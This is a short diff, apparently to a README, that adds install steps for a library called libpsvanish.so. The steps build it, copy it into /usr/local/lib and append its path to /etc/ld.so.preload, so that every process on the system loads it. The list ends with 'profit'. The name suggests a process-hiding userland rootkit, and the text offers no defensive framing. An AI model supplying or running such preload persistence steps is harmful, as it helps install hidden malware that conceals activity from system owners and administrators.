@@ -1,2 +1,5 @@
-HELLO WORLD
-
+Steps:
+1. make
+2. mv libpsvanish.so /usr/local/lib/
+3. echo /usr/local/lib/libpsvanish.so >> /etc/ld.so.preload
+4. profit 
